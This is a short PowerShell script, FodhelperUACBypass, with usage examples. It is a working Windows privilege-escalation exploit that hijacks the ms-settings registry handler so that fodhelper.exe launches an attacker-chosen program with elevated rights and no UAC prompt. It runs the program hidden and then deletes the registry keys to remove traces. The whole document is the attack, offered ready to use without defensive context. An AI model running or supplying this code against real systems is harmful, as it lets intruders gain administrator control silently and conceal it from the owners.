<#
.EXAMPLE  
　
     Load "cmd /c start C:\Windows\System32\cmd.exe" (it's default):
     FodhelperUACBypass 
　
     Load specific application:
     FodhelperUACBypass -program "cmd.exe"
     FodhelperUACBypass -program "cmd.exe /c powershell.exe"　
#>

function FodhelperUACBypass(){ 
 Param (
           
        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe" #default
       )
　
    #Create Registry Structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
　
    #Start fodhelper.exe
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
　
    #Cleanup
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
　
}
